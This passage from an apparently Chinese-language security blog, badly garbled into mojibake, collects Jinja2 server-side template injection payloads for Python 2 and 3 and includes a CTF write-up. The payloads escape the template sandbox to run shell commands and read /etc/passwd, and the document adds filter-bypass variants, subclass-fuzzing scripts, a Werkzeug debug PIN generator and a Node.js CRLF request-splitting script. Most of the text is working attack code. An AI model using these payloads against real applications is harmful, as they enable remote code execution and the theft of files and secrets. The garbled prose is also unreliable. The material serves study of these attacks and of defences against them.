&#39;list_reverseiterator&#39;&gt;, &lt;class &#39;range_iterator&#39;&gt;, &lt;class &#39;set_iterator&#39;&gt;, &lt;class &#39;str_iterator&#39;&gt;, &lt;class &#39;tuple_iterator&#39;&gt;, &lt;class &#39;collections.abc.Sized&#39;&gt;, &lt;class &#39;collections.abc.Container&#39;&gt;, &lt;class &#39;collections.abc.Callable&#39;&gt;, &lt;class &#39;os._wrap_close&#39;&gt;, &lt;class &#39;_sitebuiltins.Quitter&#39;&gt;, &lt;class &#39;_sitebuiltins._Printer&#39;&gt;, &lt;class &#39;_sitebuiltins._Helper&#39;&gt;, &lt;class &#39;types.DynamicClassAttribute&#39;&gt;, &lt;class &#39;types._GeneratorWrapper&#39;&gt;, &lt;class &#39;warnings.WarningMessage&#39;&gt;, &lt;class &#39;warnings.catch_warnings&#39;&gt;, &lt;class &#39;importlib.abc.Finder&#39;&gt;, &lt;class &#39;importlib.abc.Loader&#39;&gt;, &lt;class &#39;importlib.abc.ResourceReader&#39;&gt;, &lt;class &#39;operator.itemgetter&#39;&gt;, &lt;class &#39;operator.attrgetter&#39;&gt;, &lt;class &#39;operator.methodcaller&#39;&gt;, &lt;class &#39;itertools.accumulate&#39;&gt;, &lt;class &#39;itertools.combinations&#39;&gt;, &lt;class &#39;itertools.combinations_with_replacement&#39;&gt;, &lt;class &#39;itertools.cycle&#39;&gt;, &lt;class &#39;itertools.dropwhile&#39;&gt;, &lt;class &#39;itertools.takewhile&#39;&gt;, &lt;class &#39;itertools.islice&#39;&gt;, &lt;class &#39;itertools.starmap&#39;&gt;, &lt;class &#39;itertools.chain&#39;&gt;, &lt;class &#39;itertools.compress&#39;&gt;, &lt;class &#39;itertools.filterfalse&#39;&gt;, &lt;class &#39;itertools.count&#39;&gt;, &lt;class &#39;itertools.zip_longest&#39;&gt;, &lt;class &#39;itertools.permutations&#39;&gt;, &lt;class &#39;itertools.product&#39;&gt;, &lt;class &#39;itertools.repeat&#39;&gt;, &lt;class &#39;itertools.groupby&#39;&gt;, &lt;class &#39;itertools._grouper&#39;&gt;, &lt;class &#39;itertools._tee&#39;&gt;, &lt;class &#39;itertools._tee_dataobject&#39;&gt;, &lt;class &#39;reprlib.Repr&#39;&gt;, &lt;class &#39;collections.deque&#39;&gt;, &lt;class &#39;_collections._deque_iterator&#39;&gt;, &lt;class &#39;_collections._deque_reverse_iterator&#39;&gt;, &lt;class &#39;collections._Link&#39;&gt;, &lt;class &#39;functools.partial&#39;&gt;, &lt;class &#39;functools._lru_cache_wrapper&#39;&gt;, &lt;class &#39;functools.partialmethod&#39;&gt;, &lt;class &#39;contextlib.ContextDecorator&#39;&gt;, &lt;class &#39;contextlib._GeneratorContextManagerBase&#39;&gt;, &lt;class &#39;contextlib._BaseExitStack&#39;&gt;, &lt;class &#39;rlcompleter.Completer&#39;&gt;] 4ã€æ–‡ä»¶è¯»å–/å‘½ä»¤æ‰§è¡Œ 3ä¸ªæœ¬åœ°æµ‹è¯•æˆåŠŸçš„payload 123().__class__.__bases__[0].__subclasses__()[93].__init__.__globals__[&quot;sys&quot;].modules[&quot;os&quot;].system(&quot;ls&quot;)[].__class__.__base__.__subclasses__()[127].__init__.__globals__[&#39;system&#39;](&#39;ls&#39;)[].__class__.__base__.__subclasses__()[-1].__init__.__globals__[&#39;__builtins__&#39;][&#39;__import__&#39;](&quot;os&quot;).system(&quot;ls&quot;) 12345693&lt;class &#39;_frozen_importlib_external._NamespaceLoader&#39;&gt;127&lt;class &#39;os._wrap_close&#39;&gt;-1&lt;class &#39;rlcompleter.Completer&#39;&gt; é€šè¿‡è§‚å¯Ÿï¼Œå…¶å®å°±æ˜¯__global__ä¸­å­˜åœ¨sysæˆ–è€…systemæˆ–è€…__builtins__æ¨¡å— FUZZè„šæœ¬ 1234567891011121314#!/usr/bin/env python# encoding: utf-8for item in ().__class__.__bases__[0].__subclasses__(): try: if 'system' in item.__init__.__globals__: print('system',num,item) if 'sys' in item.__init__.__globals__: print('sys',num,item) if '__builtins__' in item.__init__.__globals__: print('__builtins__',num,item) num+=1 except: print '-' num+=1 fuzzå‡ºå¾ˆå¤šå…¶ä»–çš„ï¼Œæµ‹è¯•ä¸€ä¸‹ å°è¯•è‡ªå·±æ„é€ forå¾ªç¯ 1&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if &#39;sys&#39; in c.__init__.__globals__ %&#125;&#123;&#123; c.__init__.__globals__[&quot;sys&quot;].modules[&quot;os&quot;].system(&quot;ls&quot;)&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125; ä¸€ä¸ª0ä»£è¡¨æ‰§è¡Œä¸€æ¬¡ğŸ¤¦â€â™‚ï¸ï¼Œå‘½ä»¤æ‰§è¡Œçš„ç»“æœæ— æ³•å›æ˜¾ï¼Œåˆ©ç”¨curlå¸¦å‡º å½“ç„¶ä¹Ÿå¯ä»¥æŒ‡å®šæ¨¡å—åï¼Œå°±å¯ä»¥åªæ‰§è¡Œä¸€æ¬¡ï¼Œæ¯”å¦‚å‰é¢FUZZå‡ºæ¥çš„ 1sys 128 &lt;class &#39;_sitebuiltins.Quitter&#39;&gt; æ³¨æ„æ˜¯ååŠéƒ¨åˆ†Quitter 1&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;Quitter&#39; %&#125;&#123;&#123; c.__init__.__globals__[&quot;sys&quot;].modules[&quot;os&quot;].system(&quot;ls&quot;) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125; ä¸Šé¢ä¸‰ä¸ªæ¨¡å—ä¸­__builtins__æœ€ä¸ºä¸°å¯Œ 12345[].__class__.__base__.__subclasses__()[-1].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&quot;__import__(&#39;os&#39;).popen(&#39;id&#39;).read()&quot;)[].__class__.__base__.__subclasses__()[-1].__init__.__globals__[&#39;__builtins__&#39;][&#39;__import__&#39;](&quot;os&quot;).system(&quot;ls&quot;)[].__class__.__base__.__subclasses__()[-1].__init__.__globals__[&#39;__builtins__&#39;][&#39;open&#39;](&#39;&#x2F;etc&#x2F;passwd&#39;, &#39;r&#39;).read() æ¯”å¦‚è¿˜æœ‰chr()å‡½æ•° Jinja2çš„forå¾ªç¯å¤„ç† 123&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;Repr&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;__builtins__&#39;][&#39;open&#39;](&#39;&#x2F;etc&#x2F;passwd&#39;, &#39;r&#39;).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;Repr&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&quot;__import__(&#39;os&#39;).popen(&#39;id&#39;).read()&quot;)&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125; evalæ‰§è¡Œçš„å¥½å¤„æ˜¯ç›´æ¥æœ‰å›æ˜¾ï¼Œ Some Tricksï¼ˆæµ‹è¯•ç¯å¢ƒä¸ºPy2ï¼‰.è¢«è¿‡æ»¤ 1[].__class__.__base__.__subclasses__()[59].__init__.__globals__[&#39;linecache&#39;].__dict__[&#39;os&#39;].system(&#39;ls&#39;) ä½¿ç”¨getattr() 123456[].__class__ &#x3D;&gt; getattr([],&#39;__class__&#39;)[].__class__.__base__ &#x3D;&gt; getattr(getattr([],&#39;__class__&#39;),&#39;__base__&#39;)[].__class__.__base__.__subclasses__()[59] &#x3D;&gt; getattr(getattr(getattr([],&#39;__class__&#39;),&#39;__base__&#39;),&#39;__subclasses__&#39;)()[59][].__class__.__base__.__subclasses__()[59].__init__ &#x3D;&gt; getattr(getattr(getattr(getattr([],&#39;__class__&#39;),&#39;__base__&#39;),&#39;__subclasses__&#39;)()[59],&#39;__init__&#39;)...getattr(getattr(getattr(getattr(getattr(getattr(getattr([],&#39;__class__&#39;),&#39;__base__&#39;),&#39;__subclasses__&#39;)()[59],&#39;__init__&#39;),&#39;__globals__&#39;)[&#39;linecache&#39;],&#39;__dict__&#39;)[&#39;os&#39;],&#39;system&#39;)(&#39;ls&#39;) _è¢«è¿‡æ»¤ 1getattr(getattr(getattr(getattr(getattr(getattr(getattr([],dir(0)[0][0]*2+&#39;class&#39;+dir(0)[0][0]*2),dir(0)[0][0]*2+&#39;base&#39;+dir(0)[0][0]*2),dir(0)[0][0]*2+&#39;subclasses&#39;+dir(0)[0][0]*2)()[59],dir(0)[0][0]*2+&#39;init&#39;+dir(0)[0][0]*2),dir(0)[0][0]*2+&#39;globals&#39;+dir(0)[0][0]*2)[&#39;linecache&#39;],dir(0)[0][0]*2+&#39;dict&#39;+dir(0)[0][0]*2)[&#39;os&#39;],&#39;system&#39;)(&#39;ls&#39;) ä¸­æ‹¬å·è¢«è¿‡æ»¤ 1&#39;&#39;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[&#39;__builtins__&#39;][&#39;file&#39;](&#39;&#x2F;etc&#x2F;passwd&#39;).read() å¯ä»¥ç”¨getitemå’Œpopè¿›è¡Œç»•è¿‡è¿‡æ»¤ 1&#39;&#39;.__class__.__mro__.__getitem__(2).__subclasses__().pop(58).__init__.__globals__[&#39;__builtins__&#39;][&#39;file&#39;](&#39;&#x2F;etc&#x2F;passwd&#39;).read() å¼•å·è¢«è¿‡æ»¤ å…ˆè·å–chr()å†å°†æ–‡ä»¶åæ‹¼æ¥ 1&#123;% set chr&#x3D;().__class__.__bases__.__getitem__(0).__subclasses__()[59].__init__.__globals__.__builtins__.chr %&#125;&#123;&#123; ().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(chr(47)%2bchr(101)%2bchr(116)%2bchr(99)%2bchr(47)%2bchr(112)%2bchr(97)%2bchr(115)%2bchr(115)%2bchr(119)%2bchr(100)).read() &#125;&#125; è¿‡æ»¤åŒæ‹¬å·)) åˆ©ç”¨æ–‡ä»¶ç›²æ³¨ 1&#123;% if &#39;&#39;.__class__.__mro__[2].__subclasses__()[40](&#39;&#x2F;tmp&#x2F;aa&#39;).read()[0:1]&#x3D;&#x3D;&#39;f&#39; %&#125;~ok~&#123;% endif %&#125; å†™ä¸ªè„šæœ¬å³å¯ æ€»ç»“é€šç”¨çš„payload åŸºç±» 12&#39;&#39;.__class__.__mro__[-1]().__class__.__base__ Python 2.7 &lt;type &#39;file&#39;&gt; ä¸‹æ ‡ä¸€èˆ¬æ˜¯40ï¼Œå¦‚æœä¸è¡Œçš„è¯ä¹Ÿå¯çˆ†ç ´è¯•è¯• 1&#39;&#39;.__class__.__mro__[-1].__subclasses__()[40](&#39;&#x2F;etc&#x2F;passwd&#39;).read() osã€__builtins__ã€linecacheæ¨¡å— å¯»æ‰¾ç›¸åº”æ¨¡å—.py 12345678910111213#!/usr/bin/env python#coding=utf-8num = 0list = ['os', '__builtins__', 'linecache']for item in ''.__class__.__mro__[-1].__subclasses__(): try: for i in list: if i in item.__init__.__globals__: print(i, num, item) num += 1 except: print('-') num += 1 123&#39;&#39;.__class__.__mro__[-1].__subclasses__()[59].__init__.__globals__[&#39;__builtins__&#39;][&#39;file&#39;](&#39;&#x2F;etc&#x2F;passwd&#39;).read()&#39;&#39;.__class__.__mro__[-1].__subclasses__()[59].__init__.__globals__[&#39;linecache&#39;].os.system(&#39;ls&#39;)&#39;&#39;.__class__.__mro__[-1].__subclasses__()[71].__init__.__globals__[&#39;os&#39;].system(&#39;ls&#39;) è¿™é‡Œæœ‰å¾ˆå¤šå˜å½¢å¯ä»¥å‚è€ƒä¸Šé¢çš„ jinja2çš„forå¾ªç¯ä¸€æŠŠæ¢­ 12345&#123;% for c in &#39;&#39;.__class__.__mro__[-1].__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;Quitter&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;os&#39;].system(&#39;ls&#39;) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;&#123;% for c in &#39;&#39;.__class__.__mro__[-1].__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;catch_warnings&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;linecache&#39;].os.system(&#39;ls&#39;) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;&#123;% for c in &#39;&#39;.__class__.__mro__[-1].__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;catch_warnings&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;__builtins__&#39;][&#39;file&#39;](&#39;&#x2F;etc&#x2F;passwd&#39;).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125; Python 3.7 sysã€systemã€__builtins__æ¨¡å—ï¼Œå…¶ä¸­__builtins__å’Œpython2çš„ç•¥æœ‰ä¸åŒ å¯»æ‰¾ç›¸åº”æ¨¡å—.py 12345678910111213#!/usr/bin/env python#coding=utf-8num = 0list = ['sys', '__builtins__', 'system']for item in ''.__class__.__mro__[-1].__subclasses__(): try: for i in list: if i in item.__init__.__globals__: print(i, num, item) num += 1 except: print('-') num += 1 123&#39;&#39;.__class__.__mro__[-1].__subclasses__()[127].__init__.__globals__[&#39;__builtins__&#39;][&#39;open&#39;](&#39;&#x2F;etc&#x2F;passwd&#39;).read()&#39;&#39;.__class__.__mro__[-1].__subclasses__()[127].__init__.__globals__[&quot;sys&quot;].modules[&quot;os&quot;].system(&quot;ls&quot;)&#39;&#39;.__class__.__mro__[-1].__subclasses__()[127].__init__.__globals__[&#39;system&#39;](&#39;ls&#39;) jinja2çš„forå¾ªç¯ä¸€æŠŠæ¢­ 12345&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;_wrap_close&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;__builtins__&#39;][&#39;open&#39;](&#39;&#x2F;etc&#x2F;passwd&#39;).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;_wrap_close&#39; %&#125;&#123;&#123; c.__init__.__globals__[&quot;sys&quot;].modules[&quot;os&quot;].system(&quot;ls&quot;) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;&#123;% for c in &#39;&#39;.__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;_wrap_close&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;system&#39;](&#39;ls&#39;) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125; ======================åˆ†å‰²çº¿ å®‰æ’æ¯æŠ—ç–«æœˆèµ› æ²¡æ‰“æ¯”èµ›ï¼Œä¼¼ä¹æ˜¯è¿‡æ»¤äº†.å’Œ_ï¼Œ æˆ‘æƒ³åˆ°çš„payload 1getattr(getattr(getattr(getattr(getattr(&#39;&#39;,dir(0)[0][0]*2+&#39;class&#39;+dir(0)[0][0]*2),dir(0)[0][0]*2+&#39;mro&#39;+dir(0)[0][0]*2)[-1],dir(0)[0][0]*2+&#39;subclasses&#39;+dir(0)[0][0]*2)()[127],dir(0)[0][0]*2+&#39;init&#39;+dir(0)[0][0]*2),dir(0)[0][0]*2+&#39;globals&#39;+dir(0)[0][0]*2)[&#39;system&#39;](&#39;ls&#39;) èµ›åçœ‹åˆ°ä¸‹é¢ä¸¤ä¸ªpayload payload1ï¼Œåˆ©ç”¨16è¿›åˆ¶ç¼–ç  1&#123;&#123;&quot;&quot;[&quot;\\x5f\\x5fclass\\x5f\\x5f&quot;][&quot;\\x5f\\x5fmro\\x5f\\x5f&quot;][1][&quot;\\x5f\\x5fsubclasses\\x5f\\x5f&quot;]()[30][&quot;\\x5f\\x5finit\\x5f\\x5f&quot;][&quot;\\x5f\\x5fglobals\\x5f\\x5f&quot;][&quot;\\x5f\\x5fbuiltins\\x5f\\x5f&quot;][&#39;\\x5f\\x5fimport\\x5f\\x5f&#39;](&#39;os&#39;)[&quot;popen&quot;](&#39;cat%20&#x2F;flag*&#39;)[&#39;read&#39;]()&#125;&#125; payload2ï¼Œåˆ©ç”¨request 1&#123;&#123;()|attr(request[&#39;args&#39;][&#39;x1&#39;])|attr(request[&#39;args&#39;][&#39;x2&#39;])|attr(request[&#39;args&#39;][&#39;x3&#39;])()|attr(request[&#39;args&#39;][&#39;x4&#39;])(233)|attr(request[&#39;args&#39;][&#39;x5&#39;])|attr(request[&#39;args&#39;][&#39;x6&#39;])|attr(request[&#39;args&#39;][&#39;x4&#39;])(request[&#39;args&#39;][&#39;x7&#39;])|attr(request[&#39;args&#39;][&#39;x4&#39;])(request[&#39;args&#39;][&#39;x8&#39;])(request[&#39;args&#39;][&#39;x9&#39;])&#125;&#125;?x1&#x3D;__class__&amp;x2&#x3D;__base__&amp;x3&#x3D;__subclasses__&amp;x4&#x3D;__getitem__&amp;x5&#x3D;__init__&amp;x6&#x3D;__globals__&amp;x7&#x3D;__builtins__&amp;x8&#x3D;eval&amp;x9&#x3D;__import__(&quot;os&quot;).popen(&#39;æƒ³è¦æ‰§è¡Œçš„å‘½ä»¤&#39;).read() è¿™é‡Œçªç„¶æ„è¯†åˆ°æ–‡ç« å‰é¢éƒ½æ²¡æœ‰æåˆ°è¿‡æ»¤å™¨ï¼Œè€Œåœ¨æ¨¡ç‰ˆå¼•æ“ä¸­è¿‡æ»¤å™¨ä¹Ÿæœ‰å¾ˆå¤šszs 12345#æ¯”å¦‚flagè¢«è¿‡æ»¤ï¼Œ|reverse&#39;&#39;.__class__.__mro__[-1].__subclasses__()[40](&#39;galf&#39;|reverse).read()#æ¯”å¦‚getattrè¢«è¿‡æ»¤ï¼Œ|attr(&#39;&#39;|attr(&#39;__class__&#39;)).__mro__[-1].__subclasses__()[127].__init__.__globals__[&quot;sys&quot;].modules[&quot;os&quot;].system(&quot;ls&quot;)#names|lastï¼Œå–åºåˆ—æœ€åä¸€ä¸ªå…ƒç´ ç­‰ç­‰ =======================åˆ†å‰²çº¿ æœ‰æ—¶å€™åç«¯ä»£ç è¿‡æ»¤ä»£ç å¯èƒ½æ˜¯è¿™æ ·çš„ open (&#39;&#39;) =======================åˆ†å‰²çº¿ åˆé€›åˆ°ä¸€ç¯‡bypassçš„æ–‡ç«  ä»SSTIåˆ°æ²™ç®±é€ƒé€¸-jinja2 éœ€è¦è·å–çš„å†…å®¹åœ¨ config ä¸­ï¼Œä¸èƒ½ä½¿ç”¨(ã€)ã€selfã€config å¯ç”¨çš„ä¸Šä¸‹æ–‡å˜é‡/å‡½æ•°å¦‚ä¸‹url_for, g, request, namespace, lipsum, range, session, dict, get_flashed_messages, cycler, joiner, config åŒæ—¶åˆ©ç”¨ä¸Šä¸‹æ–‡è·å– config æ–¹å¼å¦‚ä¸‹ 1__globals__[&#39;current_app&#39;].config&#96; &#x2F; &#96;top.app.config 12url_for.__globals__[&#39;current_app&#39;].configget_flashed_messages.__globals__[&#39;current_app&#39;].config ============================åˆ†å‰²çº¿ å‚è€ƒé“¾æ¥ï¼š http://n3k0.icu/2018/09/10/Python-Sandbox-Excape/ https://lihuaiqiu.github.io/2019/07/07/SSTI%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5-Jinja2/#more","categories":[],"tags":[{"name":"SSTI","slug":"SSTI","permalink":"https://glotozz.github.io/tags/SSTI/"}]},{"title":"2020æ–°æ˜¥æˆ˜ç–«-ç½‘ç»œå®‰å…¨å…¬ç›Šèµ›-3","slug":"2020æ–°æ˜¥æˆ˜ç–«-ç½‘ç»œå®‰å…¨å…¬ç›Šèµ›-3","date":"2020-02-23T02:38:33.000Z","updated":"2020-02-27T10:45:48.427Z","comments":true,"path":"2020/02/23/2020æ–°æ˜¥æˆ˜ç–«-ç½‘ç»œå®‰å…¨å…¬ç›Šèµ›-3/","link":"","permalink":"https://glotozz.github.io/2020/02/23/2020%E6%96%B0%E6%98%A5%E6%88%98%E7%96%AB-%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%85%AC%E7%9B%8A%E8%B5%9B-3/","excerpt":"","text":"&nbsp; &nbsp; &nbsp;&nbsp;&nbsp;ç®€é™‹çš„ç›®å½• Flaskapp node_game ezExpress easy_thinking Flaskapphintä¸­æç¤ºPINï¼Œé‚£ä¹ˆä¼°è®¡åˆ©ç”¨debug https://xz.aliyun.com/t/2553?tdsourcetag=s_pctim_aiomsg /debugå¾—åˆ°æºç  è¯»å–é…ç½®åˆ©ç”¨è‡ªå¸¦çš„/encodeï¼Œç„¶åä¼ å…¥/decode 1&lt;Config &#123;&#39;ENV&#39;: &#39;production&#39;, &#39;DEBUG&#39;: True, &#39;TESTING&#39;: False, &#39;PROPAGATE_EXCEPTIONS&#39;: None, &#39;PRESERVE_CONTEXT_ON_EXCEPTION&#39;: None, &#39;SECRET_KEY&#39;: &#39;s_e_c_r_e_t_k_e_y&#39;, &#39;PERMANENT_SESSION_LIFETIME&#39;: datetime.timedelta(days&#x3D;31), &#39;USE_X_SENDFILE&#39;: False, &#39;SERVER_NAME&#39;: None, &#39;APPLICATION_ROOT&#39;: &#39;&#x2F;&#39;, &#39;SESSION_COOKIE_NAME&#39;: &#39;session&#39;, &#39;SESSION_COOKIE_DOMAIN&#39;: False, &#39;SESSION_COOKIE_PATH&#39;: None, &#39;SESSION_COOKIE_HTTPONLY&#39;: True, &#39;SESSION_COOKIE_SECURE&#39;: False, &#39;SESSION_COOKIE_SAMESITE&#39;: None, &#39;SESSION_REFRESH_EACH_REQUEST&#39;: True, &#39;MAX_CONTENT_LENGTH&#39;: None, &#39;SEND_FILE_MAX_AGE_DEFAULT&#39;: datetime.timedelta(seconds&#x3D;43200), &#39;TRAP_BAD_REQUEST_ERRORS&#39;: None, &#39;TRAP_HTTP_EXCEPTIONS&#39;: False, &#39;EXPLAIN_TEMPLATE_LOADING&#39;: False, &#39;PREFERRED_URL_SCHEME&#39;: &#39;http&#39;, &#39;JSON_AS_ASCII&#39;: True, &#39;JSON_SORT_KEYS&#39;: True, &#39;JSONIFY_PRETTYPRINT_REGULAR&#39;: False, &#39;JSONIFY_MIMETYPE&#39;: &#39;application&#x2F;json&#39;, &#39;TEMPLATES_AUTO_RELOAD&#39;: None, &#39;MAX_COOKIE_SIZE&#39;: 4093, &#39;BOOTSTRAP_USE_MINIFIED&#39;: True, &#39;BOOTSTRAP_CDN_FORCE_SSL&#39;: False, &#39;BOOTSTRAP_QUERYSTRING_REVVING&#39;: True, &#39;BOOTSTRAP_SERVE_LOCAL&#39;: False, &#39;BOOTSTRAP_LOCAL_SUBDOMAIN&#39;: None&#125;&gt; è¿˜æ˜¯å¾—ç”ŸæˆPINï¼Œéœ€è¦è¯»å–ä¸€äº›é…ç½®æ–‡ä»¶ https://www.cnblogs.com/-qing-/p/11656544.html#_label2 payload æ–‡ä»¶è¯»å– 1&#123;&#123;().__class__.__bases__[0].__subclasses__()[75].__init__.__globals__.__builtins__[&#39;open&#39;](&#39;&#x2F;etc&#x2F;passwd&#39;).read()&#125;&#125; å‘½ä»¤æ‰§è¡Œ 123&#123;&#123;().__class__.__bases__[0].__subclasses__()[75].__init__.__globals__.__builtins__[&#39;eval&#39;](&quot;__import__(&#39;os&#39;).popen(&#39;id&#39;).read()&quot;)&#125;&#125;&#123;&#123;().__class__.__bases__[0].__subclasses__()[59].__init__.__getattribute__(&#39;__global&#39;+&#39;s__&#39;)[&#39;os&#39;].__dict__[&#39;system&#39;](&#39;ls&#39;)&#125;&#125; éƒ½è¢«waf æŸ¥çœ‹ç½‘å¡ 1&#123;&#123;().__class__.__bases__[0].__subclasses__()[75].__init__.__globals__.__builtins__[&#39;open&#39;](&#39;&#x2F;sys&#x2F;class&#x2F;net&#x2F;eth0&#x2F;address&#39;).read()&#125;&#125; å¾—åˆ°02:42:ac:12:00:02=&gt;2485377957890 åœ¨dockerä¸­ï¼ŒæŸ¥çœ‹æœºå™¨ç  1&#123;&#123;().__class__.__bases__[0].__subclasses__()[75].__init__.__globals__.__builtins__[&#39;open&#39;](&#39;&#x2F;proc&#x2F;self&#x2F;cgroup&#39;).read()&#125;&#125; c87691dcb0dbd614f719b6a06e7b60484b5a760147a8f5332511356483a20df4 1234567891011probably_public_bits = [ 'flaskweb', # username 'flask.app', # modname 'Flask', # getattr(app, '__name__', getattr(app.__class__, '__name__')) '/usr/local/lib/python3.7/site-packages/flask/app.py' # getattr(mod, '__file__', None),]private_bits = [ '2485377957890',# str(uuid.getnode()), /sys/class/net/ens33/address 'c87691dcb0dbd614f719b6a06e7b60484b5a760147a8f5332511356483a20df4'# get_machine_id(), /etc/machine-id] 1234567891011121314151617181920212223242526272829303132333435363738394041import hashlibfrom itertools import chainprobably_public_bits = [ 'flaskweb', # username 'flask.app', # modname 'Flask', # getattr(app, '__name__', getattr(app.__class__, '__name__')) '/usr/local/lib/python3.7/site-packages/flask/app.py' # getattr(mod, '__file__', None),]private_bits = [ '2485377957890',# str(uuid.getnode()), /sys/class/net/ens33/address 'c13c64207f09e3ab65ae5495988d6880e7068f245add3303fd80303ad9fce46f'# get_machine_id(), /etc/machine-id]h = hashlib.md5()for bit in chain(probably_public_bits, private_bits): if not bit: continue if isinstance(bit, str): bit = bit.encode('utf-8') h.update(bit)h.update(b'cookiesalt')cookie_name = '__wzd' + h.hexdigest()[:20]num = Noneif num is None: h.update(b'pinsalt') num = ('%09d' % int(h.hexdigest(), 16))[:9]rv =Noneif rv is None: for group_size in 5, 4, 3: if len(num) % group_size == 0: rv = '-'.join(num[x:x + group_size].rjust(group_size, '0') for x in range(0, len(num), group_size)) break else: rv = numprint(rv) 1os.popen(&#39;ls &#x2F;&#39;).read() ç¿”å“¥çš„æ–¹æ³•ï¼šç›´æ¥ç»•wafå‘½ä»¤æ‰§è¡Œ 1&#123;&#123;[].__class__.__base__.__subclasses__()[127].__init__.__globals__[&#39;sys&#39;+&#39;tem&#39;](&#39;ls &#x2F;&#39;)&#125;&#125; æ²¡æœ‰å›æ˜¾ï¼Œåå¼¹shellå³å¯ node_game https://r3billions.com/writeup-split-second/?tdsourcetag=s_pctim_aiomsg 1%C4%A0HTTP%2F1.1%C4%8D%C4%8AHost%3A%C4%A0127.0.0.1%C4%8D%C4%8A%C4%8D%C4%8AGET%C4%A0%2Ffile_upload æœ¬åœ°æµ‹ä¸€ä¸‹ 123456#ä½¿ç”¨npm å®‰è£…ä¸€ä¸ªæ¨¡å— n åˆ°å…¨å±€npm install -g n#ä½¿ç”¨ n åŠ ç‰ˆæœ¬å·å°±å¯ä»¥å®‰è£…å…¶ä»–ç‰ˆæœ¬n 8.12.0#å†ä½¿ç”¨ n ï¼Œé€šè¿‡ä¸Šä¸‹é”®ï¼Œå°±å¯ä»¥é€‰æ‹©ä¸åŒçš„ç‰ˆæœ¬n wiresharké‡Œé¢æ˜¯è¿™æ ·çš„ ä¹Ÿå°±æ˜¯è¯´payloadæœ‰é—®é¢˜ï¼Œå¹¶æ²¡æœ‰å®ç°CRLFæ³¨å…¥ï¼Œä½†æ˜¯ä¸çŸ¥é“å“ªæœ‰é—®é¢˜ã€‚ã€‚ Expressæ–‡ä»¶ä¸Šä¼ ï¼ŒæŸ¥çœ‹å‚æ•°å†…å®¹ï¼Œç­‰ä¸‹æ„é€ åŒ…çš„æ—¶å€™æ–¹ä¾¿äº› 123var file_path &#x3D; &#39;&#x2F;uploads&#x2F;&#39; + req.files[0].mimetype +&quot;&#x2F;&quot;;var file_name &#x3D; req.files[0].originalnamevar dir_file &#x3D; __dirname + file_path + file_name ä½œç½¢ ======================åˆ†å‰²çº¿ èµµå¸ˆå‚…å‘äº†è„šæœ¬ï¼ŒCRLFçš„ç¼–ç å’Œwpä¸å¤ªä¸€æ · åŸç†ï¼š https://xz.aliyun.com/t/2894 åœ¨nodejs8.12.0è¿™ä¸ªç‰ˆæœ¬ä¸­, ç¨‹åºåœ¨åº•å±‚å¤„ç†çš„æ—¶å€™ä¼šèˆå¼ƒé«˜ä½çš„å­—ç¬¦, åªä¿ç•™ä½ä½çš„å­—ç¬¦, ä¹Ÿå°±æ˜¯è¯´ å‡å¦‚æˆ‘ä»¬ä¼ å…¥chr(0xffa0)å¤„ç†åä¼šè¢«æˆªæ–­ä¸ºchr(0xa0)ï¼Œå¹¶ä¸”è¿™ä¸ª0xffå¯æ›´æ¢ æµ‹è¯•CRLF 1234567891011121314import urllibimport requestspayload = ''' HTTP/1.1Host: xConnection: keep-aliveGET /file_upload HTTP/1.1Host: xConnection: closex:'''payload = payload.replace(\"\\n\", \"\\r\\n\")a = ''.join(chr(int('0xff' + hex(ord(c))[2:].zfill(2), 16))for c in payload)a = urllib.parse.quote(a)print(a) ä½†æ˜¯æ‰“é¢˜ç›®å’Œæœ¬åœ°è¿˜æ˜¯å¤±è´¥ï¼Œä¾æ—§æ˜¯304ï¼Œæˆ‘ä¸¢ï¼Œå†ç”¨è„šæœ¬å‘åŒ…å‘ç°å¯ä»¥ï¼ŒçŒœæµ‹åŸå› å¯èƒ½æ˜¯bpå‘é€GETè¯·æ±‚ä¸­æœ‰è¿™äº›éå¯è§å­—ç¬¦çš„æ—¶å€™å¯èƒ½ä¼šå‡ºé”™ è¿”å›200ï¼Œè¿”å›æºç  æ—¢ç„¶CSRFæ³¨å…¥æˆåŠŸï¼Œé…åˆSSRFä¸Šä¼ æ–‡ä»¶ ä¹‹å‰çœ‹æºç å‘ç°æˆ‘ä»¬å¯æ§æ–‡ä»¶è·¯å¾„ï¼Œä½†æ˜¯è¿˜éœ€è¦è®¿é—® 123456789app.get(&#39;&#x2F;&#39;, function(req, res) 